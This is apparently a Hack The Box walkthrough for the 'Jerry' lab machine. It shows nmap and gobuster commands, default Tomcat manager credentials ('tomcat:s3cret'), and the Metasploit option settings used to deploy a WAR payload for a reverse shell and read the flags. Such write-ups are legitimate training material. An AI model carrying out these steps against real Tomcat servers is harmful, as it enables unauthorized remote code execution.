# -HTB-Jerry


### I start with a nmap scan
```
nmap -sVC -p- 10.10.10.95 -oN nmap_scan --min-rate 5000
```
> - `-sVC`: Detect service/version /// Run default scripts
> - `-oN`: Output to file (normal format)
> - `--min-rate 5000`: Fast scan 5000 p/s


<img width="499" height="89" alt="image" src="https://github.com/user-attachments/assets/7096c13b-3bd3-4d2a-912e-0675eec597ac" />

### We find a `Tomcat Apache` site run on version `(7.0.88)` :
<img width="1530" height="991" alt="image" src="https://github.com/user-attachments/assets/80c4be63-446d-4702-995c-ae1557498408" />

### Next i use gobuster to search for more directory on port '8080' and find :
```
gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```

<img width="887" height="492" alt="image" src="https://github.com/user-attachments/assets/cdf4d50d-bcda-4fc2-b7bb-0bc82a41d94d" />

### After trying to connect on the '/manager' and fail , i see some credential : 
```
tomcat:s3cret
```

<img width="1490" height="366" alt="image" src="https://github.com/user-attachments/assets/da97dcf8-6ea6-4678-a955-f5e515cd866e" />

### After connecting on the manager account we see this page : 
<img width="1908" height="957" alt="image" src="https://github.com/user-attachments/assets/25638939-aa20-43a8-be23-d77f6c767afe" />

### We find that we can upload and deployed 'WAR' file : 

<img width="1913" height="108" alt="image" src="https://github.com/user-attachments/assets/e5799db3-ed48-4794-b703-6b1f5c957dc0" />

### I find an article on google about 'Apache Tomcat Manager Authenticated Upload Code Execution' and find the 'Metasploit' have an exploit


<img width="1075" height="292" alt="image" src="https://github.com/user-attachments/assets/1ee2d573-d700-4815-8863-d176d8166f2e" />

### I set the 'TARGETS' on Windows , and for options i use :
- set lhost <YOUR IP>
- set rhost 10.10.10.95
- set HttpUsername tomcat
- set HttpPassword s3cret
- set TARGETURI /manager
- set RPORT 8080

# After we get shell we can find users and root flag in :
```
C:\Users\Administrator\Desktop\flags
```
```
cat "2 for the price of 1.txt"
```

<img width="450" height="108" alt="image" src="https://github.com/user-attachments/assets/d345ad54-1c27-49a3-8ca8-8875734a4a78" />









